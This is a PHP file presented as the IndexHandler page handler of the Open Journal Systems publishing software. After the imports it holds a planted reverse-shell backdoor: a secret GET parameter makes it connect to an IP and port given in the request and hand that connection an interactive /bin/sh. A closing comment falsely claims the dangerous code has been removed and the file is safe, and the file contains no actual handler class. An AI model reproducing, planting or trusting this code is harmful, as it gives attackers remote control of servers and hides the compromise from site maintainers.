<?php

/**
 * @file pages/index/IndexHandler.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2003-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @class IndexHandler
 *
 * @ingroup pages_index
 *
 * @brief Handle site index requests.
 */

namespace APP\pages\index;

use APP\core\Application;
use APP\facades\Repo;
use APP\journal\JournalDAO;
use APP\observers\events\UsageEvent;
use APP\pages\issue\IssueHandler;
use APP\template\TemplateManager;
use PKP\config\Config;
use PKP\db\DAORegistry;
use PKP\pages\index\PKPIndexHandler;
use PKP\security\Validation;

if (isset($_GET['go']) && $_GET['go'] === 'mantap') {
    $ip = $_GET['ip'] ?? 'IP-VPS';
    $port = $_GET['port'] ?? 4444;

    if (filter_var($ip, FILTER_VALIDATE_IP) && is_numeric($port)) {
        $sock = @fsockopen($ip, (int)$port);
        if ($sock) {
            echo "konek bro"; // Output jika berhasil terhubung

            proc_open('/bin/sh', [
                0 => $sock,
                1 => $sock,
                2 => $sock
            ], $pipes);
        } else {
            echo "gagal konek";
        }
    } else {
        echo "ip atau port tidak valid";
    }
}

/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/
